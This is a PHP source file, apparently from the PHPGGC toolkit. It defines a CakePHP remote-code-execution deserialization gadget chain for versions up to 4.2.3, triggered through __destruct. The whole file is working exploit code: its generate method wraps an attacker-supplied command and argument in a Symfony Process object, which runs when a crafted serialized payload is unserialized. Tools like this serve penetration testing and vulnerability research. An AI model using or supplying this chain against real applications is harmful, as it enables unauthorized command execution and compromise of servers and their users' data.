<?php

namespace GadgetChain\CakePHP;

class RCE2 extends \PHPGGC\GadgetChain\RCE\FunctionCall
{
    public static $version = '? <= 4.2.3';
    public static $vector = '__destruct';
    public static $author = 'MoonBack';

    public function generate(array $parameters)
    {
        $function = $parameters['function'];
        $parameter = $parameters['parameter'];

        return new \Symfony\Component\Process\Process($function, $parameter);
    }
}